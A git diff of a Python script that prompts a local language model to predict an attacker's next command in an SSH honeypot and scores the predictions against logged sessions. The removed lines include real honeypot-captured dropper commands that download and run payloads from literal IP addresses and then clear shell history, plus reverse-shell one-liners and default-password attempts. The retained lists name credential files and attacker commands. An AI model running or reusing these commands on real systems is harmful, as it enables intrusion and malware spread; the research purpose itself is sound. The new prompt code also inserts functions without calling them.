@@ -159,7 +159,7 @@ def extract_candidates_from_response(resp_text: str, k: int) -> List[str]:
 # -------------------------
 # Ollama caller
 # -------------------------
-def query_ollama(prompt: str, model: str, url: str, temp: float=0.2, timeout: int=300) -> str:
+def query_ollama(prompt: str, model: str, url: str, temp: float=0.2, timeout: int=90) -> str:
     payload = {"model": model, "prompt": prompt, "temperature": temp, "stream": False}
     try:
         r = requests.post(url, json=payload, timeout=timeout)
@@ -182,7 +182,7 @@ def query_ollama(prompt: str, model: str, url: str, temp: float=0.2, timeout: in
 
 
 # -------------------------
-# WHITELIST + Prompt builders (uses whitelist)
+# WHITELIST = list of commands that can be used by an attacker (some commands includes util flags)
 # -------------------------
 
 WHITELIST = [
@@ -214,7 +214,7 @@ WHITELIST = [
     "rm", "rm -f", "rm -rf", "mv", "cp",
 
     # File download/upload
-    "wget", "wget <URL>", "curl", "curl <URL>",
+    "wget <URL>", "curl <URL>",
     "scp", "sftp",
 
     # Script execution / shell escalation
@@ -233,7 +233,7 @@ WHITELIST = [
     "useradd <USER>", "userdel <USER>",
     "passwd <USER>",
     "kill", "killall", "pkill",
-    "service <NAME> start", "service <NAME> stop",
+    "service <SERVICE> start", "service <SERVICE> stop",
     "systemctl start <SERVICE>", "systemctl stop <SERVICE>",
 
     # Networking & pivoting
@@ -242,8 +242,7 @@ WHITELIST = [
     "ssh <USER>@<IP>",
 
     # Data exfil placeholders
-    "cat <FILE> | base64",
-    "base64 < FILE", "xxd <FILE>",
+    "base64 < <FILE>", "xxd <FILE>",
 
     # Dangerous disk operations
     "dd if=<SRC> of=<DEST>",
@@ -253,10 +252,6 @@ WHITELIST = [
     "sudo -l", "sudo su", "su",
     "find -perm -4000",
     "cat <FILE>",
-
-    # Reverse shell placeholders
-    "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1",
-    "nc <IP> <PORT> -e /bin/bash",
 
     # Encoding / decoding / transformation
     "base64", "base64 -d",
@@ -270,8 +265,9 @@ WHITELIST = [
     "find",
 ]
 
-
-# File critici (leggibili/modificabili/eliminabili e da monitorare)
+# -------------------------
+# WHITELISTFILES = Critics files in Linux systems that should be monitored 
+# -------------------------
 WHITELISTFILES = [
     "/etc/passwd",
     "/etc/shadow",
@@ -285,8 +281,8 @@ WHITELISTFILES = [
     "/root/.bash_history",
     "/root/.profile",
     "/root/.bashrc",
-    "/home/USERNAME/.ssh/authorized_keys",  # template, USERNAME da parametrizzare
-    "/home/USERNAME/.bash_history",
+    "/home/<USERNAME>/.ssh/authorized_keys",  # template, USERNAME da parametrizzare
+    "/home/<USERNAME>/.bash_history",
     "/etc/hosts",
     "/etc/hosts.allow",
     "/etc/hosts.deny",
@@ -346,7 +342,7 @@ WHITELISTFILES = [
     "/var/run/docker.sock",
     "/etc/kubernetes/admin.conf",
     "/root/.kube/config",
-    "/home/USERNAME/.aws/credentials",
+    "/home/<USERNAME>/.aws/credentials",
     "/root/.aws/credentials",
     "/etc/ssl/certs/ca-certificates.crt",
     "/etc/hosts.allow",
@@ -387,7 +383,9 @@ WHITELISTFILES = [
     "/etc/default/grub.d/40_custom",
 ]
 
-# Cartelle critiche (terminano tutte con '/')
+# -------------------------
+# WHITELISTFOLDERS = Critics folders in Linux systems that contains files that can be used by an attacker (the name of these files can change and is not unique across all systems, which is why the placeholder <FILE> is used.) 
+# -------------------------
 WHITELISTFOLDERS = [
     "/etc/<FILE>",
     "/etc/ssh/<FILE>",
@@ -463,178 +461,80 @@ WHITELISTFOLDERS = [
     "/proc/<FILE>",
 ]
 
+def _whitelist_commands() -> str:
+    commands = "\n".join(WHITELIST)
+    return f"ALLOWED COMMANDS:\n{commands}\n\n"
 
-# ============================================
-# 🧱 WHITELIST COMPLETA (aggregata da dataset Cowrie)
-# ============================================
-'''
-WHITELIST = [
-    # 🧍‍♂️ User / System info
-    "whoami", "id", "groups", "hostname", "uptime",
-    "uname", "uname -a", "uname -m",
-
-    # 🧠 CPU / Hardware info
-    "cat /proc/cpuinfo",
-    "cat /proc/cpuinfo | grep name | wc -l",
-    "cat /proc/cpuinfo | grep model | grep name | wc -l",
-    "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-    "lscpu", "lscpu | grep Model", "lsmod", "dmidecode|grep Vendor|head -n 1",
-
-    # ⚙️ Process / System monitoring
-    "ps aux", "ps -x", "top", "top -b -n1", "LC_ALL=C top -bn1",
-    "free -m", "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-    "df -h", "w", "who", "env", "dmesg | grep irtual", "lspci | grep irti",
-
-    # 📁 File system / Navigation
-    "ls", "ls -la", "ls -lh", "pwd", "cd /", "cd /tmp", "ls -lh $(which ls)",
-    "ls /tmp", "ls /var/tmp", "cat /tmp/<FILE>", "cat /var/tmp/<FILE>",
-    "cat /var/tmp/.var03522123 | head -n 1", "cat /var/tmp/.systemcache436621",
-
-    # 🧾 Configuration / System files
-    "cat /etc/passwd", "cat /etc/hosts", "cat /etc/os-release", "cat /etc/issue",
-
-    # ⏰ Cron / Scheduling
-    "crontab -l", "cat /etc/crontab",
-
-    # 📡 Networking (read-only)
-    "netstat -tunlp", "ss -tunlp", "ip a", "ifconfig", "ping -c 1 8.8.8.8",
-
-    # 🧩 Temporary / Variable files
-    "echo \"321\" > /var/tmp/.var03522123",
-    "rm -rf /var/tmp/.var03522123",
-    "rm -rf /var/tmp/dota*",
-    "rm /tmp/foo; touch /tmp/foo;", "ls -al /tmp/foo;", "rm /tmp/foo;",
-
-    # 🧮 Miscellaneous commands
-    "^C",
-
-    # 💾 Potential malicious / propagation commands (kept for detection context, not to execute)
-    "killall -9 perl;cd /var/tmp/ ; cd /tmp/ ; rm -rf ssh1.txt ; wget http://185.234.217.21/ssh1.txt ; mv ssh1.txt wget.txt ; perl wget.txt 193.169.254.11; lwp-download http://185.234.217.21/ssh1.txt ; mv ssh1.txt lynx.txt ; perl lynx.txt 193.169.254.11;fetch http://185.234.217.21/ssh1.txt ; mv ssh1.txt fetch.txt ; perl fetch.txt 193.169.254.11; curl -O http://185.234.217.21/ssh1.txt ; mv ssh1.txt curl.txt ; perl curl.txt 193.169.254.11 ; rm -rf ssh1.txt wget.txt lynx.txt fetch.txt curl.txt",
-    "cat /etc/issue; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://104.248.150.167/servicesd000/fx19.x86; cat fx19.x86 > sshupdate; chmod +x *; ./sshupdate r00ted; history -c",
-    "cat /etc/issue; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://104.248.150.167/servicesd000/fx19.x86; cat fx19.x86 > ssh-xuma19; chmod +x ssh-xuma19; ./ssh-xuma19 r00ted; history -c",
-    "echo \"cd /tmp; wget http://46.246.45.171/wget.sh || curl http://46.246.45.171/curl.sh -o curl.sh; chmod +x *.sh; ./wget.sh; ./curl.sh\" | sh",
-    "cd /tmp; wget google.com",
-
-    # 🔐 echo password attempts (for detection, sanitized)
-    "echo \"admin guest\" > /tmp/up.txt",
-    "echo \"admin admin1234\" > /tmp/up.txt",
-    "echo \"admin 7ujMko0admin\" > /tmp/up.txt",
-    "echo \"admin P@55w0rd\" > /tmp/up.txt",
-    "echo \"admin access\" > /tmp/up.txt",
-    "echo \"admin letmein\" > /tmp/up.txt",
-    "echo \"admin articon\" > /tmp/up.txt",
-    "echo \"admin nimda\" > /tmp/up.txt",
-    "echo \"admin administrador\" > /tmp/up.txt",
-    "echo \"admin p@$$wOrd\" > /tmp/up.txt",
-    "echo \"admin password\" > /tmp/up.txt",
-    "echo \"admin 123123\" > /tmp/up.txt",
-    "echo \"admin qwe@1234\" > /tmp/up.txt",
-    "echo \"admin qwe123\" > /tmp/up.txt",
-    "echo \"admin 1q2w3e4r5t6y\" > /tmp/up.txt",
-    "echo \"admin 4dm1n\" > /tmp/up.txt",
-    "echo \"admin nospam\" > /tmp/up.txt",
-    "echo \"admin changeme\" > /tmp/up.txt",
-    "echo \"admin P@ssw0rds\" > /tmp/up.txt",
-    "echo \"admin songswell\" > /tmp/up.txt",
-    "echo \"admin p@55w0rd\" > /tmp/up.txt",
-    "echo \"admin qaz_2wsx\" > /tmp/up.txt",
-    "echo \"admin !QAZ2wsx#EDC\" > /tmp/up.txt",
-    "echo \"admin root\" > /tmp/up.txt",
-    "echo \"admin !QAZ@WSX#EDC\" > /tmp/up.txt",
-    "echo \"admin super\" > /tmp/up.txt",
-    "echo \"admin sysmail\" > /tmp/up.txt",
-    "echo \"admin 1qaz$RFV\" > /tmp/up.txt",
-    "echo \"admin service\" > /tmp/up.txt",
-    "echo \"admin secure\" > /tmp/up.txt",
-    "echo \"admin password!\" > /tmp/up.txt",
-    "echo \"admin P455w0rd@dm1n\" > /tmp/up.txt",
-    "echo \"admin P@ssword1!\" > /tmp/up.txt",
-    "echo \"admin AitbISP4eCiG\" > /tmp/up.txt",
-    "echo \"admin !@#$abcd,\" > /tmp/up.txt",
-    "echo \"admin 22222\" > /tmp/up.txt",
-    "echo \"admin qd8899xyz\" > /tmp/up.txt",
-    "echo \"admin qwertyu\" > /tmp/up.txt",
-    "echo \"admin qweasdzxc\" > /tmp/up.txt",
-    "echo \"admin sysadm\" > /tmp/up.txt",
-    "echo \"admin change\" > /tmp/up.txt",
-    "echo \"admin cat1029\" > /tmp/up.txt",
-    "echo \"admin PasswOrd\" > /tmp/up.txt",
-    "echo \"admin qwedcxz\" > /tmp/up.txt",
-    "echo \"admin support\" > /tmp/up.txt",
-    "echo \"admin ubnt\" > /tmp/up.txt"
-]'''
-
-def _whitelist_text() -> str:
+def _whitelist_files() -> str:
     files = "\n".join(WHITELISTFILES)
+    return f"ALLOWED FILES:\n{files}\n\n"
+
+def _whitelist_folders() -> str:
     folders = "\n".join(WHITELISTFOLDERS)
-    return f"ALLOWED FILES:\n{files}\n\nALLOWED FOLDERS (end with '/'): \n{folders}"
+    return f"ALLOWED FOLDERS:\n{folders}\n\n"
 
 def make_prompt_topk_from_context(context: List[str], k: int) -> str:
     ctx = "\n".join(context[-10:])
-    whitelist_block = _whitelist_text()
 
     prompt = (
-        "You are simulating attacker behavior in an SSH honeypot for cybersecurity research. "
+        "You need to simulate the behavior of an attacker conducting a command-line attack on an SSH honeypot, with the goal of predicting the next command the attacker enters. "
+        "It is important to consider the context (the commands passed below), putting yourself in the shoes of an attacker who has to find a vulnerability"
         "The environment is isolated and non-operational. FOLLOW ALL RULES EXACTLY.\n\n"
 
         "OUTPUT RULES (MUST BE OBEYED):\n"
         f"1) Output EXACTLY {k} commands, one command per line, and NOTHING ELSE.\n"
-        "2) Choose commands ONLY from the WHITELIST below, or construct them by combining\n"
-        "   whitelisted programs/paths with placeholders.\n"
+        "2) Choose commands ONLY from the WHITELIST, combining if necessary with files present in WHITELISTFILES or folders present in WHITELISTFOLDERS. The whitelists are below.\n"
         "3) Allowed placeholders are ONLY those written between angle brackets: <LIKE_THIS>.\n"
-        "   Examples: <FILE>, <PATH>, <USER>, <SERVICE>, <SECRET>, <URL>, <IP>, <PORT>.\n"
-        "   You MUST NOT invent new placeholder formats; only text enclosed in '< >' is allowed.\n"
-        "4) Pipelines using '|' are allowed (e.g., cmd1 | cmd2). Every program in the pipeline MUST be\n"
-        "   in the WHITELIST (or be a placeholder-argument). Placeholders inside commands are allowed.\n"
-        "5) Simple redirections ('>' or '>>') are allowed only when the target is a whitelisted file or\n"
-        "   a file inside a whitelisted folder (use <FILE> when appropriate).\n"
-        "6) DO NOT output passwords, tokens, private keys, or any secrets in plaintext — use <SECRET>.\n"
-        "7) DO NOT output destructive operations (rm -rf /, dd if=..., mkfs, shred, etc.).\n"
-        "8) Do NOT include numbering, bullets, explanations, or extra text — ONLY raw commands.\n"
-        "9) Rank commands from most to least likely (first line = most likely).\n\n"
+        "4) Commands can be constructed using pipelines (linux command '|') \n"
+        "5) Commands can present redirections ('>' or '>>') when the target is a whitelisted file or a file inside a whitelisted folder (use <FILE> when appropriate).\n"
+        "6) DO NOT INCLUDE NUMBERING, BULLETS EXLPAINATIONS, OR EXTRA TEXT - ONLY RAW COMMANDS."
+        "7) Rank commands from most to least likely (first line = most likely).\n\n"
 
-        "WHITELIST (use only these when constructing commands):\n"
-        f"{whitelist_block}\n\n"
+        "WHITELIST (containing commands):\n"
+        f"{_whitelist_commands}\n\n"
+
+        "WHITELISTFILES (containing critics files that can be used with previous commands):\n"
+        f"{_whitelist_files}\n\n"
+
+        "WHITELISTFOLDERS (containing critics folders that can be used with previous commands):\n"
+        f"{_whitelist_folders}\n\n"
 
         "CONTEXT (most recent last):\n"
         f"{ctx}\n\n"
 
-        f"Now OUTPUT EXACTLY {k} candidate next commands, one per line, chosen from the WHITELIST above. "
-        "Pipelines and redirections are allowed only if every element complies with the WHITELIST rules."
+        f"Now OUTPUT EXACTLY {k} candidate next commands"
     )
     return prompt
 
 def make_prompt_topk_for_single(cmd: str, k: int) -> str:
-    whitelist_block = _whitelist_text()
 
     prompt = (
-        "You are simulating attacker behavior in an SSH honeypot for cybersecurity research. "
+        "You need to simulate the behavior of an attacker conducting a command-line attack on an SSH honeypot, with the goal of predicting the next command the attacker enters. "
+        "It is important to consider the context (the commands passed below), putting yourself in the shoes of an attacker who has to find a vulnerability"
         "The environment is isolated and non-operational. FOLLOW ALL RULES EXACTLY.\n\n"
 
         "OUTPUT RULES (MUST BE OBEYED):\n"
         f"1) Output EXACTLY {k} commands, one command per line, and NOTHING ELSE.\n"
-        "2) Choose commands ONLY from the WHITELIST below or construct them using whitelisted programs and\n"
-        "   allowed placeholders.\n"
-        "3) Allowed placeholders are ONLY strings enclosed in angle brackets '< >'.\n"
-        "   Valid examples: <FILE>, <PATH>, <USER>, <SERVICE>, <SECRET>, <URL>, <IP>, <PORT>.\n"
-        "   You MUST NOT use any placeholder not enclosed in '< >'.\n"
-        "4) Pipelines ('|') are allowed. Every program in the pipeline MUST be in the WHITELIST.\n"
-        "   Placeholders inside the pipeline are allowed.\n"
-        "5) Simple redirections ('>' or '>>') are allowed only toward whitelisted files or files inside\n"
-        "   whitelisted folders (use <FILE> if needed).\n"
-        "6) DO NOT output passwords, tokens, private keys, or secrets — use <SECRET> instead.\n"
-        "7) DO NOT output destructive commands (rm -rf, shred, dd if=..., mkfs, etc.).\n"
-        "8) Do NOT include commentary, numbering, bullets, or anything except raw commands.\n"
-        "9) Rank commands from most to least likely.\n\n"
+        "2) Choose commands ONLY from the WHITELIST, combining if necessary with files present in WHITELISTFILES or folders present in WHITELISTFOLDERS. The whitelists are below.\n"
+        "3) Allowed placeholders are ONLY those written between angle brackets: <LIKE_THIS>.\n"
+        "4) Commands can be constructed using pipelines (linux command '|') \n"
+        "5) Commands can present redirections ('>' or '>>') when the target is a whitelisted file or a file inside a whitelisted folder (use <FILE> when appropriate).\n"
+        "6) DO NOT INCLUDE NUMBERING, BULLETS EXLPAINATIONS, OR EXTRA TEXT - ONLY RAW COMMANDS."
+        "7) Rank commands from most to least likely (first line = most likely).\n\n"
 
-        "WHITELIST (use only these when constructing commands):\n"
-        f"{whitelist_block}\n\n"
+        "WHITELIST (containing commands):\n"
+        f"{_whitelist_commands}\n\n"
+
+        "WHITELISTFILES (containing critics files that can be used with previous commands):\n"
+        f"{_whitelist_files}\n\n"
+
+        "WHITELISTFOLDERS (containing critics folders that can be used with previous commands):\n"
+        f"{_whitelist_folders}\n\n"
 
         "LAST COMMAND EXECUTED (most recent):\n"
         f"{cmd}\n\n"
 
         f"Now OUTPUT EXACTLY {k} candidate next commands, one per line. "
-        "Pipelines are allowed only if every element respects the WHITELIST rules."
     )
     return prompt
 
@@ -772,17 +672,25 @@ def main():
         # permissive comparison: check if expected normalized matches any candidate normalized
         hit = False
         if expected and candidates_clean:
-            exp_key = normalize_for_compare(expected)
+            exp_keys = normalize_for_compare(expected)
+            if not exp_keys:
+                continue
+            exp_cmd = exp_keys[0]  # take first command in pipeline
+
             for rnk, cand in enumerate(candidates_clean, start=1):
-                cand_key = normalize_for_compare(cand)
+                cand_keys = normalize_for_compare(cand)
+                if not cand_keys:
+                    continue
+                cand_cmd = cand_keys[0]
+
                 # require same command name, and if expected has path require path compatibility
-                name_match = (cand_key[0] == exp_key[0] and cand_key[0] != "")
-                if exp_key[1]:
-                    # expected has path -> require path exact or prefix match (permissive)
-                    path_match = (cand_key[1] == exp_key[1]
-                                  or (cand_key[1] and (exp_key[1].startswith(cand_key[1]) or cand_key[1].startswith(exp_key[1]))))
+                name_match = (cand_cmd[0] == exp_cmd[0] and cand_cmd[0] != "")
+                if exp_cmd[1]:
+                    path_match = (cand_cmd[1] == exp_cmd[1]
+                                  or (cand_cmd[1] and (exp_cmd[1].startswith(cand_cmd[1]) or cand_cmd[1].startswith(exp_cmd[1]))))
                 else:
                     path_match = True
+
                 if name_match and path_match:
                     hit = True
                     if rnk == 1:
@@ -835,6 +743,7 @@ def main():
     print(f"Top-1 hits: {top1_hits}/{total_done} -> {top1_rate*100:.2f}%")
     print(f"Detailed results: {args.out}")
     print(f"Summary: {args.out}.summary.json")
+
 
 if __name__ == "__main__":
     main()
